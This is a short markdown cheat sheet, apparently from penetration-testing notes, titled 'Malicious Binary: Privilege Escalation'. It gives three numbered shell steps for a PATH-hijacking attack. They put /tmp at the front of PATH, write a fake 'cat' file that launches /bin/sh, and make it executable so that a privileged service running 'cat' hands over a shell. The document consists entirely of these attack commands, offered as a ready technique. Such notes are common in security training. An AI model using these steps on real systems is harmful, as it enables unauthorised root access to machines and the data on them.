# Malicious Binary: Privilege Escalation

1. Add current working directory to PATH

        export PATH=/tmp:$PATH
        cd /tmp/

2. Create a malicious binary file with desired filename, e.g., `cat`

        echo '/bin/sh' > cat

3. Give execute permissions to the malicious binary, and let it get executed by a privileged service

        chmod +x cat
